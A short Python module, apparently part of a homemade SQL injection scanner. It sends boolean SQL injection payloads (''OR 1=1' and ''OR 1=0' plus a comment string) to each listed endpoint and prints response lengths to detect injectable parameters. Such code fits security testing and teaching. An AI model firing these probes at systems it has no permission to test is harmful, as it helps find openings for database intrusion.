import requests

from SQLi.confirm_sqli import *

payloads = [
    "'OR 1=0",
    "'OR 1=1"
]

def try_boolean_sqli(url, options: list):
    vuln_endpoints = options[0]
    db_comment = options[1]
    print(vuln_endpoints)
    for endp in vuln_endpoints:
        for pld in payloads:
            # I should check for 200 status code here
            pld = requests.utils.quote(pld + db_comment)
            r = requests.get(url = url + endp + pld)
            print(url + endp + pld)
            print(len(r.text))